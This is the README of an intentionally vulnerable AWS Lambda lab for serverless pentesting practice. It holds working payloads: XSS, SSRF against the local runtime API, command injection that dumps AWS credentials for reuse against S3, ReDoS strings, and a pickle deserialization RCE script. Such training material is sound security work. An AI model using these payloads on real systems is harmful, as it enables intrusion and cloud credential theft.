# Very Vulnerable Lambda Application 

<img width="1789" alt="image" src="https://user-images.githubusercontent.com/86191568/191029575-40cf84ca-8c0e-46fc-ba8b-e88fb07977e0.png">



- - -
Very Vulnerable Lambda Application is a intentionally vulnerable application aiming to be an solution for security professionals to learn lambda pentesting in testing environment.

- - -
## Prerequisites

- To get started configure aws, It will prompt for your AWS access key and secret key please fill in those details and set the region as us-west-2.

    `aws configure`

- In order to package your dependencies locally with serverless-python-requirements, you need to have Python3.8 installed locally. You can create and activate a dedicated virtual environment with the following command:

    `python3.9 -m venv ./venv`
    
    `source ./venv/bin/activate`
    
- Setup [serverless framework](https://www.serverless.com/framework/docs/getting-started).
    
    `npm install -g serverless`

- Install httpie to interact via terminal

    `https://httpie.io/cli`
	
- - -
## Endpoints

- GET /
- GET /welcome/<name>
- [POST,GET] /login
- GET /redirect
- GET /date
- GET /redos
- GET /deserial
	
- - -
## Vulnerabilities

- Injection Vulnerability
- SSRF/Runtime Invocation Vulnerability
- Command Execution
- ReDoS vulnerability
- Python deserialization vulnerability
- Misconfigured IAM permission
	
- - -
## Setup Instruction

- Step 1: Clone vulnerable lambda application.

    `git clone https://github.com/justmorpheus/very-vulnerable-serverless`

- Step 2: Change to directory and configure AWS

    `cd very-vulnerable-serverless`
	
- Step 3: Run the sed command to replace the bucket name to unique bucket name. 

    `sed -i'' -e "s/myrandombucket/$(uuidgen | tr '[:upper:]' '[:lower:]')/g" serverless.yml`

- Step 4: Run the below command to install serverless-python-requirements

    `sls plugin install -n serverless-python-requirements && sls plugin install -n serverless-s3-deploy`

- Step 5: Deploy the app

    `sls deploy`
    
`Note: Incase want to run and test locally run sls wsgi serve`

Wait for the function to deploy completely
After running deploy, you should see output similar to:
<img width="761" alt="image" src="https://user-images.githubusercontent.com/86191568/191020528-7931c0ec-018d-46d6-86d3-da0a42157881.png">

```
Deploying vulnerable-lambda to stage dev (us-east-1)
Service deployed to stack vulnerable-lambda-dev (182s)
endpoint: ANY - https://xxxxxxxx.execute-api.us-east-1.amazonaws.com
functions:
  api: vulnerable-lambda-dev-app (1.3 MB)
	
Deploying vulnerable-lambda-dev-app to stage dev (us-east-1)
```
	
- Step 5: To access the application from UI, enter the endpoint in the browser:

    `https://xxxxxxxx.execute-api.us-east-1.amazonaws.com`

- Step 6: To access the index.html, run 

    `http get https://<sls-endpoint>.amazonaws.com/dev`

- Step 7: To exploit code injection vulnerability:

    `Open Browser and enter the payload in the name "><img src=x onerror=alert('xss')>`
    
- Step 8: To access Runtime Invocation/SSRF Vulnerability 

    `http get https://<sls-endpoint>/dev/redirect?url=http://127.0.0.1:9001/2018-06-01/runtime/invocation/next`

Replace <sls-endpoint> to your endpoint url
You will see an output like this

```
HTTP/1.1 200 OK
Connection: keep-alive
Content-Length: 3362
Content-Type: application/json
Date: Mon, 19 Sep 2022 12:51:25 GMT
Via: 1.1 07fc2bc5d694987fb9600fd890abcf99.cloudfront.net (CloudFront)
X-Amz-Cf-Id: s-9O72IRA5bgt1yHjTZmXiirfC4mucvf58E25iYpVhUdzLxhvmaMhQ==
X-Amz-Cf-Pop: DEL54-C2
X-Amzn-Trace-Id: Root=1-632865cd-3a79uyt60eceb8441913898a;Sampled=0
X-Cache: Miss from cloudfront
x-amz-apigw-id: YtTYJF4WPHxxXAw=
x-amzn-Remapped-Content-Length: 3362
x-amzn-RequestId: a56op6dc-0e13-48eq-bc9e-067912db6f7b

{
    "output": "\"{\\\"resource\\\":\\\"/{proxy+}\\\",\\\"path\\\":\\\"/redirect\\\",\\\"httpMethod\\\":\\\"GET\\\",\\\"headers\\\":{\\\"Accept\\\":\\\"*/*\\\",\\\"Accept-Encoding\\\":\\\"gzip, deflate\\\",\\\"CloudFront-Forwarded-Proto\\\":\\\"https\\\",\\\"CloudFront-Is-Desktop-Viewer\\\":\\\"true\\\",\\\"CloudFront-Is-Mobile-Viewer\\\":\\\"false\\\",\\\"CloudFront-Is-SmartTV-Viewer\\\":\\\"false\\\",\\\"CloudFront-Is-Tablet-Viewer\\\":\\\"false\\\",\\\"CloudFront-Viewer-ASN\\\":\\\"17747\\\",\\\"CloudFront-Viewer-Country\\\":\\\"IN\\\",\\\"Host\\\":\\\"vscpen3dmf.execute-api.us-west-2.amazonaws.com\\\",\\\"User-Agent\\\":\\\"HTTPie/3.2.1\\\",\\\"Via\\\":\\\"1.1 07fc4bc5d694987fb9600fd890abcf0c.cloudfront.net (CloudFront)\\\",\\\"X-Amz-Cf-Id\\\":\\\"s-9O72IRA5bgt1yHjTZmXiirfC4muSTx08E25iYpVhUdzLxhvmaMhQ==\\\",\\\"X-Amzn-Trace-Id\\\":\\\"Root=1-632865cd-3a79cfd60eceb84419138d2a\\\",\\\"X-Forwarded-For\\\":\\\"1.1.1.1, 2.2.2.2\\\",\\\"X-Forwarded-Port\\\":\\\"443\\\",\\\"X-Forwarded-Proto\\\":\\\"https\\\"},\\\"multiValueHeaders\\\":{\\\"Accept\\\":[\\\"*/*\\\"],\\\"Accept-Encoding\\\":[\\\"gzip, deflate\\\"],\\\"CloudFront-Forwarded-Proto\\\":[\\\"https\\\"],\\\"CloudFront-Is-Desktop-Viewer\\\":[\\\"true\\\"],\\\"CloudFront-Is-Mobile-Viewer\\\":[\\\"false\\\"],\\\"CloudFront-Is-SmartTV-Viewer\\\":[\\\"false\\\"],\\\"CloudFront-Is-Tablet-Viewer\\\":[\\\"false\\\"],\\\"CloudFront-Viewer-ASN\\\":[\\\"17747\\\"],\\\"CloudFront-Viewer-Country\\\":[\\\"IN\\\"],\\\"Host\\\":[\\\"vscpen3dmf.execute-api.us-west-2.amazonaws.com\\\"],\\\"User-Agent\\\":[\\\"HTTPie/3.2.1\\\"],\\\"Via\\\":[\\\"1.1 07fc4bc5d694987fb9600fd890abcf0c.cloudfront.net (CloudFront)\\\"],\\\"X-Amz-Cf-Id\\\":[\\\"s-9O72IRA5bgt1yHjTZmXiirfC4muSTx08E25iYpVhUdzLxhvmaMhQ==\\\"],\\\"X-Amzn-Trace-Id\\\":[\\\"Root=1-632865cd-3a79cfd60eceb84419138d2a\\\"],\\\"X-Forwarded-For\\\":[\\\"1.1.1.1, 2.2.2.2\\\"],\\\"X-Forwarded-Port\\\":[\\\"443\\\"],\\\"X-Forwarded-Proto\\\":[\\\"https\\\"]},\\\"queryStringParameters\\\":{\\\"url\\\":\\\"http://127.0.0.1:9001/2018-06-01/runtime/invocation/next\\\"},\\\"multiValueQueryStringParameters\\\":{\\\"url\\\":[\\\"http://127.0.0.1:9001/2018-06-01/runtime/invocation/next\\\"]},\\\"pathParameters\\\":{\\\"proxy\\\":\\\"redirect\\\"},\\\"stageVariables\\\":null,\\\"requestContext\\\":{\\\"resourceId\\\":\\\"a11ui0\\\",\\\"resourcePath\\\":\\\"/{proxy+}\\\",\\\"httpMethod\\\":\\\"GET\\\",\\\"extendedRequestId\\\":\\\"YtTYJF4WPHcFXAw=\\\",\\\"requestTime\\\":\\\"19/Sep/2022:12:51:25 +0000\\\",\\\"path\\\":\\\"/dev/redirect\\\",\\\"accountId\\\":\\\"880096392120\\\",\\\"protocol\\\":\\\"HTTP/1.1\\\",\\\"stage\\\":\\\"dev\\\",\\\"domainPrefix\\\":\\\"vscpen3dmf\\\",\\\"requestTimeEpoch\\\":1663591885535,\\\"requestId\\\":\\\"a56bd6dc-0e13-48f1-bc9e-067912db6f7b\\\",\\\"identity\\\":{\\\"cognitoIdentityPoolId\\\":null,\\\"accountId\\\":null,\\\"cognitoIdentityId\\\":null,\\\"caller\\\":null,\\\"sourceIp\\\":\\\"1.1.1.1\\\",\\\"principalOrgId\\\":null,\\\"accessKey\\\":null,\\\"cognitoAuthenticationType\\\":null,\\\"cognitoAuthenticationProvider\\\":null,\\\"userArn\\\":null,\\\"userAgent\\\":\\\"HTTPie/3.2.1\\\",\\\"user\\\":null},\\\"domainName\\\":\\\"vscpen3dmf.execute-api.us-west-2.amazonaws.com\\\",\\\"apiId\\\":\\\"vscpen3dmf\\\"},\\\"body\\\":null,\\\"isBase64Encoded\\\":false}\""
}
```

- Step 9: You should see AWS related sensitive information.
    
- Step 10: To exploit command injection vulnerability & misconfigured permissions:
	
    `http get https://<sls-endpoint>/dev/date?exec=date`

You will see an output like this	
```
HTTP/1.1 200 OK
Connection: keep-alive
Content-Length: 44
Content-Type: application/json
Date: Mon, 19 Sep 2022 13:10:28 GMT
Via: 1.1 f52fa9ddf23e95c892a74419663288da.cloudfront.net (CloudFront)
X-Amz-Cf-Id: 4PI0jtMwyNYK39T7gRiYlKBWH_pxfzYPB07vzIocBt-zzNj85z4EGA==
X-Amz-Cf-Pop: DEL54-C2
X-Amzn-Trace-Id: Root=1-63286a44-5babe1f924314b7d2009a5c7;Sampled=0
X-Cache: Miss from cloudfront
x-amz-apigw-id: YtWKrHCRvHcF8Jw=
x-amzn-Remapped-Content-Length: 44
x-amzn-RequestId: 43b9dd4a-f64b-42e0-ad5e-222209fde183

{
    "output": "Mon Sep 19 13:10:28 UTC 2022\n"
}
```
- Step 11: change the request parameter to `exec=ls`:

    `http get https://<sls-endpoint>/dev/date?exec=ls -la`
    
- Step 12: change the request parameter to `exec=printenv`:

    `http get https://<sls-endpoint>/dev/date?exec=printenv`

You will see an output like this	
```
HTTP/1.1 200 OK
Connection: keep-alive
Content-Length: 2117
Content-Type: application/json
Date: Tue, 03 Jan 2023 14:29:31 GMT
Via: 1.1 2625470c3f9fce93fd4488fd43d6e9bc.cloudfront.net (CloudFront)
X-Amz-Cf-Id: QLZ8-jIrI7dVVROqPN8qrEGsMXaYx0keM4Lm6o-xZWarw2r2ypJiTw==
X-Amz-Cf-Pop: DEL54-C3
X-Amzn-Trace-Id: Root=1-63b43bcb-0026b5940af821c0221fef40;Sampled=0
X-Cache: Miss from cloudfront
x-amz-apigw-id: eK5HwE7CvHcFhDQ=
x-amzn-Remapped-Content-Length: 2117
x-amzn-RequestId: 24d2e182-d961-474e-9e89-8bef9a530d05

{
    "output": "AWS_LAMBDA_FUNCTION_VERSION=$LATEST\nAWS_SESSION_TOKEN=IQoJb3JpZ2luX2KotzFF4GLaajUG+JZbh3Na5s04zpmHHiFFXalH01bucEv7hgVJ9g==\nLD_LIBRARY_PATH=/var/lang/lib:/lib64:/usr/lib64:/var/runtime:/var/runtime/lib:/var/task:/var/task/lib:/opt/lib\nLAMBDA_TASK_ROOT=/var/task\nAWS_LAMBDA_LOG_GROUP_NAME=/aws/lambda/vulnerable-lambda-dev-app\nAWS_LAMBDA_LOG_STREAM_NAME=2023/01/03/[$LATEST]ba63b5870c7148ba3246c23f7a\nAWS_LAMBDA_RUNTIME_API=127.0.0.1:9001\nAWS_EXECUTION_ENV=AWS_Lambda_python3.8\nAWS_XRAY_DAEMON_ADDRESS=169.254.79.129:2000\nAWS_LAMBDA_FUNCTION_NAME=vulnerable-lambda-dev-app\nPATH=/var/lang/bin:/usr/local/bin:/usr/bin/:/bin:/opt/bin\nAWS_DEFAULT_REGION=us-west-2\nPWD=/var/task\nAWS_SECRET_ACCESS_KEY=d2DCHZFQ76i\nLAMBDA_RUNTIME_DIR=/var/runtime\nLANG=en_US.UTF-8\nAWS_LAMBDA_INITIALIZATION_TYPE=on-demand\nAWS_REGION=us-west-2\nTZ=:UTC\nAWS_ACCESS_KEY_ID=ASIA4B2\nSHLVL=1\n_AWS_XRAY_DAEMON_ADDRESS=169.251.79.129\n_AWS_XRAY_DAEMON_PORT=2000\nPYTHONPATH=/var/runtime\n_X_AMZN_TRACE_ID=Root=1-63b43bcb-0026baf821c0221fef40;Parent=6a23d6b63f;Sampled=0\nAWS_XRAY_CONTEXT_MISSING=LOG_ERROR\n_HANDLER=wsgi_handler.handler\nVARIABLE_1=supersecret99\nAWS_LAMBDA_FUNCTION_MEMORY_SIZE=1024\n_=/usr/bin/printenv\n"
}
```

- Step 13: Now export the variable on the local and read the app.py code. Find out the name of the bucket:

```
export AWS_ACCESS_KEY_ID=
export AWS_SECRET_ACCESS_KEY=
export AWS_SESSION_TOKEN=
```

The run below mentioned commands, make sure aws cli is installed:

```
aws sts get-caller-identity
aws s3 ls s3://<bucket-name>
touch demo.txt ; aws s3 cp demo.txt s3://<bucket-name>
```

- Step 14:  To test the redos attack vulnerability & check the response time:
	
    `http get https://<sls-endpoint>/dev/redos?string=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaab`

- Step 15:  To exploit redos attack vulnerability, check the response time & it might show internal server error:
	
    `http get https://<sls-endpoint>/dev/redos?string=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa`
 
 You will see an output like this
 
 ```
HTTP/1.1 502 Bad Gateway
Connection: keep-alive
Content-Length: 36
Content-Type: application/json
Date: Mon, 02 Jan 2023 23:10:40 GMT
Via: 1.1 716c49c7502c387328492319a3e03a1e.cloudfront.net (CloudFront)
X-Amz-Cf-Id: k4m88qvZlPmCJdIxQsVjRX_DXP3YRxVScl8eVx6jbkt_6HcAIVc2bg==
X-Amz-Cf-Pop: DEL54-C3
X-Cache: Error from cloudfront
x-amz-apigw-id: eIygpHbovHcFc6g=
x-amzn-ErrorType: InternalServerErrorException
x-amzn-RequestId: 8e192cca-facc-4c8e-8ad2-07d1c599c854

{
    "message": "Internal server error"
}
```


- Step 16:  To exploit python deserialization vulnerability part-1, run :
	
```
$ python3
>>> import pickle
>>> import base64
>>> obj = {'a': 1, 'b': 2}
>>> data = pickle.dumps(obj)
>>> b64data = base64.urlsafe_b64encode(data).decode()
>>> print (b64data)
gAN9cQAoWAEAAABhcQFLAVgBAAAAYnECSwJ1Lg==
```

Then run to validate if serialization is working or not
    `http --form POST http://<sls-endpoint>/dev/deserial pickled='gAN9cQAoWAEAAABhcQFLAVgBAAAAYnECSwJ1Lg=='`
 
You will see an output like this
 
 ```
HTTP/1.0 200 OK
Content-Length: 20
Content-Type: text/html; charset=utf-8
Date: Tue, 03 Jan 2023 15:30:42 GMT
Server: Werkzeug/1.0.1 Python/3.8.16

pickled successfully
```
	
Then to exploit run the command from terminal:

```
cat <<EOF >>attack.py
import pickle
import base64
import requests
import sys

class PickleRCE(object):
    def __reduce__(self):
        import os
        return (os.system,(command,))

#Change the url 
default_url = 'http://<sls-endpoint>/dev/deserial'
url = sys.argv[1] if len(sys.argv) > 1 else default_url
command = 'touch /tmp/hacked'  # Reverse Shell Payload Change IP/PORT

pickled = 'pickled'  # This is the POST parameter of our vulnerable Flask app
payload = base64.b64encode(pickle.dumps(PickleRCE()))  # Crafting Payload
requests.post(url, data={pickled: payload})  # Sending POST request
EOF	
```

Install requests dependency:
` python3 -m pip install requests`

Then run attack.py to exploit, make sure to edit the lambda endpoint in attack.py script:
	`python3 attack.py`

Then to check the successful execution:
	`http get https://<sls-endpoint>/dev/date?exec=ls+-la+/tmp/hacked`
	

- - -
## Destroy the Lab

- Step 1: Change to directory

    `cd very-vulnerable-serverless`

- Step 2: Destroy the app

   `sls remove`

Note: It might show error in case S3 bucket is not empty.

- - -
## Meaning of serverless.yaml

```
	
This is a YAML configuration file for the Serverless Framework. It is defining a service called "vulnerable-lambda" that will be deployed to the AWS cloud provider in the us-west-2 region. The service is written in Python 3.8 and has the files "app.py" and "requirements.txt" included in the package that will be deployed. The "venv" and "node_modules" directories are excluded from the package. The service uses the "serverless-python-requirements" and "serverless-wsgi" plugins, and the "wsgi" section defines the WSGI application object as "app.app" and specifies that the requirements should not be packed. There is a single function called "app" that is associated with the WSGI handler and exposes HTTP event triggers for requests to the root path ("/") and any other path ("/{proxy+}").
	
```

- - -
## Disclaimer

***Do not install Very Vulnerable Serverless on a production environment***

Author do not take responsibility for the way in which any one uses this application. Author have made the purpose of the application clear and it should not be used maliciously.

## License
Very Vulnerable Lambda Application is free software: you can redistribute it and/or modify it under the terms of the GNU General Public License as published by the Free Software Foundation, either version 3 of the License, or (at your option) any later version.

Very Vulnerable Lambda Application is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU General Public License for more details.

You should have received a copy of the GNU General Public License along with Very Vulnerable Lambda Application .  If not, see http://www.gnu.org/licenses/.


Note: Thanks to https://github.com/CalfCrusher/Python-Pickle-RCE-Exploit
